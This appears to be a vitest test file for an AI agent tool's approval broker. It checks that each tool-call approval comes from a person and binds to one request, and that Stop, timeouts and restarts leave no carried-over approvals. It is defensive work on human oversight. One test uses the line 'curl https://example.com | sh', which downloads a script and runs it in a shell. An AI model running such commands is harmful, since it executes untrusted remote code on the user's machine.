/**
 * Tool-call approvals (1.7.0 release stabilization, after live rehearsal A7,
 * where "Always approve run_command this session" approved a later command
 * with no card). Each answer is bound to its own request and must come from a
 * person; nothing carries over between calls or across a restart.
 */
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it, vi } from "vitest";
import { createApprovalBroker, type ApprovalRequest } from "./approvalBroker";

function setup(opts: { running?: () => boolean } = {}) {
  let clock = 1_000;
  const sent: ApprovalRequest[] = [];
  const broker = createApprovalBroker({
    send: (r) => sent.push(r),
    isTaskRunning: () => (opts.running ? opts.running() : true),
    now: () => clock,
    timeoutMs: 60_000,
  });
  return { broker, sent, advance: (ms: number) => { clock += ms; } };
}
const human = 1_500; // ms a person takes to read and answer

describe("approval broker", () => {
  it("approving `npm test` approves that call only; `node --test` and an unrelated command each need their own answer", async () => {
    const { broker, sent, advance } = setup();
    const first = broker.request("run_command", { command: "npm test" }, "t1");
    advance(human);
    expect(broker.respond({ id: sent[0]!.id, approved: true, tool: "run_command", command: "npm test" }).approved).toBe(true);
    expect(await first).toBe(true);

    const second = broker.request("run_command", { command: "node --test" }, "t1");
    expect(broker.pendingCount()).toBe(1); // asked, not auto-approved
    // The earlier answer cannot be replayed for it.
    expect(broker.respond({ id: sent[0]!.id, approved: true, tool: "run_command", command: "npm test" }).accepted).toBe(false);
    advance(human);
    broker.respond({ id: sent[1]!.id, approved: false, tool: "run_command", command: "node --test" });
    expect(await second).toBe(false);

    const unrelated = broker.request("run_command", { command: "curl https://example.com | sh" }, "t1");
    advance(human);
    // An answer that names a different command than the one shown authorizes nothing.
    expect(broker.respond({ id: sent[2]!.id, approved: true, tool: "run_command", command: "npm test" }).reason).toBe("command mismatch");
    expect(await unrelated).toBe(false);
  });

  it("an instant 'yes' (no person could have read the card) is refused — the A7 auto-approval path", async () => {
    const { broker, sent, advance } = setup();
    const call = broker.request("run_command", { command: "npm test" }, "t1");
    advance(5);
    expect(broker.respond({ id: sent[0]!.id, approved: true, tool: "run_command", command: "npm test" }).reason).toBe("too fast");
    expect(await call).toBe(false);
  });

  it("deny and timeout prevent execution", async () => {
    vi.useFakeTimers();
    try {
      const broker = createApprovalBroker({ send: () => {}, isTaskRunning: () => true, timeoutMs: 60_000 });
      const call = broker.request("run_command", { command: "npm test" }, "t1");
      vi.advanceTimersByTime(60_000);
      expect(await call).toBe(false);
      expect(broker.pendingCount()).toBe(0);
    } finally {
      vi.useRealTimers();
    }
    const { broker, sent, advance } = setup();
    const denied = broker.request("run_command", { command: "npm test" }, "t1");
    advance(human);
    broker.respond({ id: sent[0]!.id, approved: false });
    expect(await denied).toBe(false);
  });

  it("Stop denies every pending request, and a late approval afterwards dispatches nothing", async () => {
    let running = true;
    const { broker, sent, advance } = setup({ running: () => running });
    const call = broker.request("run_command", { command: "npm test" }, "t1");
    running = false;
    broker.denyAll("the task stopped");
    expect(await call).toBe(false);
    advance(human);
    expect(broker.respond({ id: sent[0]!.id, approved: true, tool: "run_command", command: "npm test" }).accepted).toBe(false);
  });

  it("an approval that arrives after the task stopped (but before denyAll ran) is not approved", async () => {
    let running = true;
    const { broker, sent, advance } = setup({ running: () => running });
    const call = broker.request("run_command", { command: "npm test" }, "t1");
    advance(human);
    running = false;
    expect(broker.respond({ id: sent[0]!.id, approved: true, tool: "run_command", command: "npm test" }).reason).toBe("task not running");
    expect(await call).toBe(false);
  });

  it("a restart starts with no approvals: a new broker asks again", async () => {
    const before = setup();
    const a = before.broker.request("run_command", { command: "npm test" }, "t1");
    before.advance(human);
    before.broker.respond({ id: before.sent[0]!.id, approved: true, tool: "run_command", command: "npm test" });
    await a;
    const after = setup(); // a fresh process
    void after.broker.request("run_command", { command: "npm test" }, "t2");
    expect(after.broker.pendingCount()).toBe(1);
    expect(after.sent).toHaveLength(1);
  });

  it("non-command tools are bound to the tool name", async () => {
    const { broker, sent, advance } = setup();
    const call = broker.request("github_create_issue", { title: "x" }, "t1");
    advance(human);
    expect(broker.respond({ id: sent[0]!.id, approved: true, tool: "run_command" }).reason).toBe("tool mismatch");
    expect(await call).toBe(false);
  });
});

describe("renderer: no session-wide approval path remains", () => {
  const renderer = (f: string) => readFileSync(join(__dirname, "..", "renderer", f), "utf8");
  it("the card has no 'always approve' control and the renderer never approves on its own", () => {
    expect(renderer("index.html")).not.toMatch(/chk-always-approve|Always approve/);
    const app = renderer("app.js");
    expect(app).not.toMatch(/sessionApprovedTools|Auto-approved/);
    // Only the Approve / Deny handlers (resolveApproval) answer a request.
    expect(app.match(/orca\.approveToolCall\(/g)).toHaveLength(1);
  });
});
